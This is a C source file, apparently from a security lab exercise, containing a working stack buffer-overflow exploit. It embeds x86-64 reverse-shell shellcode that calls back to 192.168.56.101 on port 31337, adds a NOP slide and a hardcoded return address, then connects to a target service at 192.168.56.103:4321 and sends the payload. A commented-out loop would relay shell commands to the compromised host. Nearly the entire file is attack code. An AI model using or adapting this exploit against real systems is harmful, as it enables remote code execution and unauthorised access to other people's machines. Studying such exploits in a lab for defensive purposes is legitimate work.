#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>

#include <string.h>

// For the reverse shell
#define IPADDR "\xc0\xa8\x38\x65" /* 192.168.56.101 */
#define PORT "\x7a\x69" /* 31337 */

// Thanks to Clément Gachod for having shared his solution with me so I could debug mine

int main(int argc, char* argv[]) {
	
	// A shellcode to open a shell
//	unsigned char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
//	int shell_len = 27;
	
	// A shellcode to open a reverse shell
	unsigned char shellcode[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02"PORT"\xc7\x44\x24\x04"IPADDR"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05";
	int shell_len = 118;
	
	
	// Starting address of buf in little endian
	unsigned char ret[] = "\xf0\xe5\xff\xff\xff\x7f\x00\x00";
	
	unsigned char msg[256];
	memset(msg, 0, 256);
	
	
	// The total length of msg (minus \n)
//	int n = atoi(argv[1]);
	int n = 148;
	int NOP_len = n - shell_len - 8;
	
	// The payload
	for (int k = 0; k < shell_len; k++) {
		msg[k] = shellcode[k];
	}
		
	// The NOP-slide
	for (int k = shell_len; k < shell_len + NOP_len; k++) {
		msg[k] = '\x90';
	}
	
	// The return address
	for (int k = 0; k < 8; k++) {
		msg[k + shell_len + NOP_len] = ret[k];
	}
	
	// Adding the \n so fgets returns
	msg[shell_len + NOP_len + 8] = '\n';
	
	
	
	printf("msg: %s\n", msg);
	/*
	for (int k = 0; k < shell_len + NOP_len + 10; k++) {
		printf("%d: %x\n", k, msg[k]);
	}
	*/
	
	
	
	
	// Building destination addr_in
	struct sockaddr_in dest;
	dest.sin_family = AF_INET;
	dest.sin_port = htons(4321);
	if (inet_pton(AF_INET, "192.168.56.103", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
	for (int k = 0; k < 8; k++) dest.sin_zero[k] = 0;

	// Building the socket
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("Error building socket");
  		exit(1);
  	}
	
	// Connecting
	if (connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in)) != 0) {
		printf("Failed to connect");
  		exit(1);
	} else {
		printf("\nConnected successfully\n\n");
	}

	
	// Message 1
	int buf_len = 2000;
	char recvbuf[buf_len];
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error receiving message");
  		exit(1);
	}
	printf("Message 1: %s\n", recvbuf);
	
	
	// Sending attack
	if (send(sockfd, msg, n + 1, 0) != n + 1) {
		printf("Failed to send message entirely");
  		exit(1);
	} else {
		printf("Attack sent\n\n");
	}
	
	
	// Sending commands to the shell and getting the replies
	// The execution of the command must return something otherwise the program breaks
	/*
	while (1) {
	
		// Sending command to be executed
		char command[310];
		memset(command, 0, 310);
		printf("Please input command to send\n-> ");
		fgets(command, 300, stdin);
		if (send(sockfd, command, strlen(command), 0) != strlen(command)) {
			printf("Failed to send message entirely");
	  		exit(1);
		} else {
			printf("Command sent\n\n");
		}
		
		
		// Reply
		memset(recvbuf, 0, buf_len);
		int recv_status = recv(sockfd, recvbuf, buf_len, 0);
		if (recv_status == -1) {
			printf("Error receiving message: %d\n\n", errno);
	  		exit(1);
		} else if (recv_status == 0) {
			printf("Connection terminated\n");
			exit(1);
		}
		
		printf("%s\n\n\n", recvbuf);
	
	}
	*/
	
	return 0;
	
}
